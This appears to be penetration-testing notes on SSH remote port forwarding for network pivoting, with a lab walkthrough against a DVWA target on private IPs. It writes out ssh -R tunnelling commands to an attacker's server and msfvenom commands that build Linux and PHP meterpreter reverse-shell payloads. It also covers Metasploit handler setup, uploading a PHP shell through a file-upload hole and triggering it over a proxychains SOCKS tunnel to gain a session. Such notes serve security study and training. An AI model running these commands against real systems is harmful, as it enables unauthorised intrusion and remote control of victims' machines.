# Remote Port Forwarding

## 01 - Usage

```
$ cat /etc/ssh/sshd_config
..[snip]..
GatewayPorts yes
..[snip]..
```

- Victim port forwarding to the attacker's SSH server

`$ ssh -NTfCq -R <bind_address>:<local_port>:<remote_ip>:<bind_port> <username>@<attacker_IP>`

- Remote Port forwarding reverse shells SSH C2 Server as a WAN

`$ ssh -NTfCq -R <local_port>:127.0.0.1:<bind_port> <username>@<IP>`

- Generate a reverse callback shell and start a shell handler via `netcat`

```
$ msfvenom -p linux/x86/shell/reverse_tcp lhost=<SSH_IP> lport=<local_port> -f elf -o shell.elf

$ nc -lnvp <bind_port>
```

- Generate a reverse callback shell and start a shell handler via `metasploit`

```
$ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<SSH_IP> lport=<local_port> -f elf -o shell.elf

msf > use payload/linux/x86/meterpreter/reverse_tcp

msf payload(linux/x86/meterpreter/reverse_tcp) > set lhost <SSH_IP>

msf payload(linux/x86/meterpreter/reverse_tcp) > set lport <bind_port>

msf payload(linux/x86/meterpreter/reverse_tcp) > to_handler
```

## 02 - Scenarios

### 2.1 - Reverse Tunneling

```
$ ssh fox@10.0.2.15

fox@ubuntulinux:~$ ssh -NTfCq -R 8888:192.168.56.106:80 -o "UserKnownHostsFile=/dev/null StrictHostKeyChecking=no" user@10.0.2.4
```

![[01 - Reverse Port Forwarding.png]]

```
$ ss -antp
State          Recv-Q         Send-Q                 Local Address:Port                    Peer Address:Port          Process
LISTEN         0              128                          0.0.0.0:22                           0.0.0.0:*
LISTEN         0              128                          0.0.0.0:8888                         0.0.0.0:*
ESTAB          0              0                           10.0.2.4:42586                      10.0.2.15:22             users:(("ssh",pid=5282,fd=3))
ESTAB          0              0                           10.0.2.4:22                         10.0.2.15:44498
LISTEN         0              128                             [::]:22                              [::]:*
LISTEN         0              128                             [::]:8888                            [::]:*
```

### 2.2 - Reverse Shell Tunnel

TODO: Make a network topology diagram to illustrate the pivoting scenario

`$ ssh fox@10.0.2.15 -NTfCq -D1080 -R 192.168.56.111:4455:127.0.0.1:4445`

![[01 - Reverse Shell Tunnel.png]]

`$ msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.111 lport=4455 -f raw -o rsh.php`

Launch a shell handler in metasploit for incoming sessions.

```
msf6 > use exploit/mutli/handler
[*] Using configured payload php/meterpreter/reverse_tcp
msf6 > exploit(multi/handler) > set payload php/meterpreter/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf6 > exploit(multi/handler) > set lhost 192.168.56.111
lhost => 192.168.56.111
msf6 > exploit(multi/handler) > set lport 4445
lport => 4445
msf6 > exploit(multi/handler) > exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[-] Handler failed to bind to 192.168.56.111:4445:-  -
[*] Started reverse TCP handler on 0.0.0.0:4445
```

Upload the reverse shell.

![[02 - PHP File Upload.png]]

Edit the Proxychains configuration.

```
$ cat /etc/proxychains4.conf
..[snip]..
socks5 Â 127.0.0.1 1080
```

Then execute the reverse shell.

```
$ proxychains curl -X GET http://192.168.56.106/dvwa/hackable/uploads/rsh.php
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.106:80  ...  OK

$ curl --socks5 127.0.0.1:1080 -X GET http://192.168.56.106/dvwa/hackable/uploads/rsh.php
```

We have established a meterpreter reverse shell.

![[03 - MSF Reverse Callback Shell.png]]

---
## References

- [LinuxHint: SSH StrickHostKeyChecking](https://linuxhint.com/ssh-stricthostkeychecking/)

- [SkyDogCon 2017: "SSH+MSF+TOR = Anonymous Remote Shells" by Catatonic Prime](https://www.youtube.com/watch?v=RvZ9-hD-KZw)

- [PayloadsAllTheThings: Network Pivoting Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)

- [FareedFauzi OSCP Playbook: Port Forwarding SSH Tunneling](https://fareedfauzi.gitbook.io/oscp-notes/others/port-forwarding-ssh-tunneling)

- [Certcube: Pivoting and SSH Port Forwarding Basics](https://blog.certcube.com/pivoting-and-ssh-port-forwarding-basics/)

- [Certcube: Pivoting Port Forwarding](https://blog.certcube.com/pivoting-port-forwarding/)

- [RawSec: Overview of Network Pivoting and Tunneling](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)

### Scenarios

- [Bryan Leong (NobodyAtall): Network Pivoting Using SSH Return Reverse Shell From Internal Network Machine](https://bryanleong98.medium.com/network-pivoting-using-ssh-return-reverse-shell-from-internal-network-machine-f1c5043b2d86)

- [Anestis Bechtsoudis: Using SSH Socks Proxies with MSF Reverse TCP Payloads](https://bechtsoudis.com/archive/2012/06/08/using-ssh-socks-proxies-with-msf-reverse-tcp-payloads/index.html)